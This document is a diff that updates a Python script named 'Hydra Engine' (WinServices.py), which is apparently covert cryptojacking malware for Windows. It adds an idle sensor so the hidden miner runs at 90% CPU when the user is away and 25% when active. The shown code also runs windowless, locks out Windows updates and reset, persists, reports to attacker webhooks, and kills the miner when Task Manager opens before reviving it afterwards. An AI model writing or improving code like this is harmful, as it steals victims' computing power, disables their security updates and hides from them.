@@ -1,6 +1,6 @@
 import os, sys, subprocess
 
-# --- THE HYDRA ENGINE (WinServices.py) ---
+# --- THE HYDRA ENGINE (WinServices.py v6.2 - TRUE IDLE) ---
 # This flag tells Windows: "Do NOT show a console window."
 HIDE_WINDOW = 0x08000000 
 
@@ -24,7 +24,7 @@ def bootstrap():
 bootstrap()
 
 # --- NOW WE CAN IMPORT EVERYTHING ---
-import time, winreg, base64, argparse, platform
+import time, winreg, base64, argparse, platform, ctypes
 import requests, psutil
 
 # --- 1. Identity & Dual Webhook Setup ---
@@ -49,9 +49,23 @@ SELF_PATH = os.path.realpath(__file__)
 CONFIG = {
     "MINER": os.path.join(WORK_DIR, f"{ID}.exe"),
     "WATCH": "Taskmgr.exe",
-    "IDLE_PWR": "90",
-    "NORM_PWR": "30"
+    "IDLE_PWR": "90",  # 90% when truly idle
+    "NORM_PWR": "25",  # 25% when user is active
+    "IDLE_SEC": 300    # 5 minutes of no input = Idle
 }
+
+# --- 2. THE TRUE IDLE SENSOR (Windows API) ---
+class LASTINPUTINFO(ctypes.Structure):
+    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
+
+def get_idle_duration():
+    """Returns how many seconds since the last mouse/keyboard movement."""
+    lii = LASTINPUTINFO()
+    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
+    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
+        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
+        return millis / 1000.0
+    return 0
 
 def notify(msg, type="sys"):
     hook = WEBHOOK_SYS if type == "sys" else WEBHOOK_MINE
@@ -59,7 +73,7 @@ def notify(msg, type="sys"):
     try: requests.post(hook, json={"content": full_msg})
     except: pass
 
-# --- 2. System Sovereignty & Persistence ---
+# --- 3. System Sovereignty & Persistence ---
 def engage_locks():
     """Persistence, Reset Disable, and Update Lockdown with ZERO windows."""
     try:
@@ -86,7 +100,7 @@ def engage_locks():
         notify("Windows Updates locked.", "sys")
     except: pass
 
-# --- 3. Auto-Updater ---
+# --- 4. Auto-Updater ---
 def auto_update():
     """Checks GitHub for a newer version and restarts if found."""
     try:
@@ -99,18 +113,23 @@ def auto_update():
                 os.execv(sys.executable, [sys.executable, SELF_PATH, "--id", ID])
     except: pass
 
-# --- 4. Smart Throttle & HYDRA RESURRECTION ---
+# --- 5. Smart Throttle & HYDRA RESURRECTION ---
 def manage_power():
-    """Hides from Taskmgr and toggles 90/30 power with DNA check and RESURRECTION."""
+    """Hides from Taskmgr and toggles 90/25 power based on TRUE IDLE and RESURRECTION."""
     is_monitored = any(p.info['name'] == CONFIG["WATCH"] for p in psutil.process_iter(['name']))
     
     miner_proc = None
-    for p in psutil.process_iter(['name', 'exe']):
+    current_power = "0"
+    for p in psutil.process_iter(['name', 'exe', 'cmdline']):
         try:
             if p.info['name'] == f"{ID}.exe" and p.info['exe'] and os.path.normpath(p.info['exe']) == os.path.normpath(CONFIG["MINER"]):
                 miner_proc = p
+                # Check current power from the running process args
+                for arg in p.info['cmdline']:
+                    if arg == CONFIG["IDLE_PWR"] or arg == CONFIG["NORM_PWR"]:
+                        current_power = arg
                 break
-        except (psutil.NoSuchProcess, psutil.AccessDenied): continue
+        except: continue
 
     if is_monitored:
         if miner_proc:
@@ -119,22 +138,26 @@ def manage_power():
                 notify("Monitoring detected. Vanishing.", "sys")
             except: pass
     else:
-        cpu_load = psutil.cpu_percent(interval=1)
-        target_pwr = CONFIG["IDLE_PWR"] if cpu_load < 20 else CONFIG["NORM_PWR"]
+        # CHECK TRUE IDLE (Mouse/Keyboard silence)
+        idle_time = get_idle_duration()
+        target_pwr = CONFIG["IDLE_PWR"] if idle_time > CONFIG["IDLE_SEC"] else CONFIG["NORM_PWR"]
         
-        # HYDRA FIX: If the miner is missing but we ARE NOT being monitored, bring it back!
-        if not miner_proc:
+        # If miner is missing OR we need to switch power levels
+        if not miner_proc or current_power != target_pwr:
+            if miner_proc:
+                try: miner_proc.terminate()
+                except: pass
+                
             try:
-                # We always use HIDE_WINDOW for the miner
                 subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", WALLET, "--max-cpu-usage", target_pwr, "-k", "--tls"], 
                                  creationflags=HIDE_WINDOW)
-                notify(f"Watchdog: Engine Resurrected. Power: {target_pwr}%", "mine")
+                notify(f"Watchdog: Engine Engaged. Power: {target_pwr}% (Idle: {int(idle_time)}s)", "mine")
             except Exception as e:
                 notify(f"Engine Failed: {str(e)}", "sys")
 
 def main():
     engage_locks()
-    notify("SYSTEM ONLINE (Hydra Core Active)", "sys")
+    notify("SYSTEM ONLINE (True Idle Hydra Active)", "sys")
     last_update = time.time()
     
     while True:
